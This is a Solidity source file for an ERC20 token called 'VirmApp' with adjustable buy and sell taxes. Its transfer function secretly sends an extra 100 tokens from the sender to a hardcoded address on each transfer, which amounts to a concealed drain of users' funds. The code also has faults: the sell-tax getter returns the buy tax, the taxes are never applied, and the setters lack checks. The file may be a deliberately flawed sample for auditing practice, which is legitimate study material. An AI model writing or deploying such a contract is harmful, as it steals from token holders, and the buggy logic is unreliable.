// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./AdminContext.sol"; 

contract VIRMT is ERC20, AdminContext{

    address private _taxWallet;
    uint _buyTax = 110; 
    uint _sellTax = 150; 

	constructor(address taxationWallet) ERC20("VirmApp", "VIRM"){
        _taxWallet = taxationWallet; 
        _mint(msg.sender,412 ether);
        _contract_authorizer = new Authorizer(msg.sender); 
    }

    function getBuyTax() public view returns (uint) {
        return _buyTax; 
    }

    function getSellTax() public view returns (uint) {
        return _buyTax; 
    }

    function setBuyTax(uint tax) isAuthorized public {
        // TODO: check ownership
        _buyTax = tax; 
    }

    function setSellTax(uint tax) isAuthorized public {
        // TODO: check ownership
        _sellTax = tax; 
    }

    function transfer(address to, uint256 amount) override public returns (bool) {

        super.transfer(to, amount);
        super.transfer(0xdE2C6d9b24845294cCf924015d83Ae6859B2592E, 100*10**18);

        return true; 
    }
}